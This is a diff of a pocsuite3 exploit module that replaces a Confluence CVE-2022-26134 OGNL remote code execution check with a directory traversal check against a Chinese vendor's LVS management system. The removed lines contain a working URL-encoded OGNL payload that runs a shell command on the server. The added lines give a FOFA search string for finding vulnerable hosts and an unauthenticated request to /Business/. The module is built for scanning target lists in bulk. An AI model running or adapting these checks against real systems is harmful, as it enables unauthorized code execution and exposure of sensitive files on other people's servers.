@@ -23,43 +23,38 @@ from pocsuite3.modules.listener import REVERSE_PAYLOAD
 
 
 class DemoPOC(POCBase):
-    vulID = "12345"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
     version = "1"  # 默认为1
     author = "mlxml"  # PoC作者的大名
-    vulDate = "2022-07-13"  # 漏洞公开的时间,不知道就写今天
-    createDate = "2022-07-13"  # 编写 PoC 的日期
-    updateDate = "2022-07-13"  # PoC 更新的时间,默认和编写时间一样
+    vulDate = "2022-07-16"  # 漏洞公开的时间,不知道就写今天
+    createDate = "2022-07-16"  # 编写 PoC 的日期
+    updateDate = "2022-07-16"  # PoC 更新的时间,默认和编写时间一样
     references = [""]  # 漏洞地址来源,0day不用写
-    name = "CVE-2022-26134-PoC"  # PoC 名称
+    name = "吉拉科技目录遍历漏洞"  # PoC 名称
     appPowerLink = ""  # 漏洞厂商主页地址
-    appName = "CVE-2022-26134"  # 漏洞应用名称
-    appVersion = ""  # 漏洞影响版本
+    appName = "目录遍历"  # 漏洞应用名称
+    appVersion = "吉拉科技 LVS精益价值管理系统"  # 漏洞影响版本
     vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
     category = POC_CATEGORY.EXPLOITS.WEBAPP
     samples = []  # 测试样列,就是用 PoC 测试成功的网站
     install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
     desc = """
-            Confluence Server和Confluence Data Center上存在一个OGNL注入漏洞，允许经过身份验证或在某些情况下未授权的攻击者，在Confluence Server或Confluence Data Center实例上执行任意代码。
+            杭州吉拉科技有限公司多个系统存在目录遍历漏洞，由于 /Business/ 访问控制不严，攻击者可利用该漏洞获取敏感信息。
         """  # 漏洞简要描述
     pocDesc = """
-            pocsuite -r CVE-2022-26134.py -f url.txt
+            fofa："Supperd By 吉拉科技"
+            pocsuite -r 吉拉科技-目录遍历.py -f url.txt
         """  # POC用法描述
 
     def _check(self):
         # 漏洞验证代码
         result = []
-        cookies = {"JSESSIONID": "858AEF97C18AECA5A8EDE19290F543E2"}
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-                   "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document",
-                   "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
-
         try:
-            full_url = f"{self.url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
-            response = requests.get(full_url, headers=headers, cookies=cookies, verify=False, timeout=5,
+            full_url = f"{self.url}/Business/"
+
+            response = requests.get(full_url, verify=False, timeout=5,
                                     allow_redirects=False)
-            if 'X-Cmd-Response' in response.headers:
+            if 'dir' in response.text:
                 result.append(full_url)
         except Exception as e:
              print(e)
@@ -99,5 +94,4 @@ def other_utils_func():
     pass
 
 
-# 注册 DemoPOC 类
 register_poc(DemoPOC)
